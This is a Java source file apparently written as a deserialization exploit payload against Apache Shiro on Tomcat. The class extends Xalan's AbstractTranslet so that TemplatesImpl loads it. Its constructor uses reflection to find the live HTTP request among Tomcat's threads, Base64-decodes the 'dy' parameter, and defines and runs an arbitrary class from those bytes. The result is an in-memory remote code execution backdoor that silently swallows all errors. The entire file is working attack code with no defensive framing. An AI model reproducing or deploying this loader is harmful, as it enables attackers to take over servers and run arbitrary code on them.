package com.sorry.utils.templatesimpl;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/**
 * created by 0x22cb7139 on 2021/7/26
 */
public class TomcatClassloader extends AbstractTranslet {
    static{
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public TomcatClassloader() {
        try {
            Object o;
            String s;
            String dy = null;
            Object resp;
            boolean done = false;
            Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < ts.length; i++) {
                Thread t = ts[i];
                if (t == null) {
                    continue;
                }
                s = t.getName();
                if (!s.contains("exec") && s.contains("http")) {
                    o = getFV(t, "target");
                    if (!(o instanceof Runnable)) {
                        continue;
                    }

                    try {
                        o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                    } catch (Exception e) {
                        continue;
                    }

                    java.util.List ps = (java.util.List) getFV(o, "processors");
                    for (int j = 0; j < ps.size(); j++) {
                        Object p = ps.get(j);
                        o = getFV(p, "req");
                        resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);

                        Object conreq = o.getClass().getMethod("getNote", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});

                        dy = (String) conreq.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(conreq, new Object[]{new String("dy")});

                        if (dy != null && !dy.isEmpty()) {
                            byte[] bytecodes = org.apache.shiro.codec.Base64.decode(dy);

                            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                            defineClassMethod.setAccessible(true);

                            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});

                            cc.newInstance().equals(conreq);
                            done = true;
                        }
                        if (done) {
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {

        }
    }


    public static Object getFV(Object obj,String fieldName) throws Exception{
        java.lang.reflect.Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }
}
